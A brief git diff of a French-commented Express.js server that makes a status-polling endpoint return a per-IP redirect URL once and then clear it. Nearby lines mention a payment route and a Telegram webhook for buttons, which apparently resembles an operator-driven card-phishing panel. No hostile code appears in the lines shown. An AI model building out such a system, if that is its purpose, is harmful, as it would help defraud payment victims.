@@ -133,7 +133,15 @@ app.post('/api/payment', (req,res)=>{
 // Polling status pour redirection
 app.get('/api/status', (req,res)=>{
   const ip = getIP(req);
-  res.json({redirect:sessions[ip]?.redirect || null});
+  if(!sessions[ip]){
+    return res.json({redirect:null});
+  }
+  const redirect = sessions[ip].redirect || null;
+
+  // on renvoie l'URL puis on reset pour éviter la boucle
+  sessions[ip].redirect = null;
+
+  res.json({redirect});
 });
 
 // Telegram webhook pour boutons
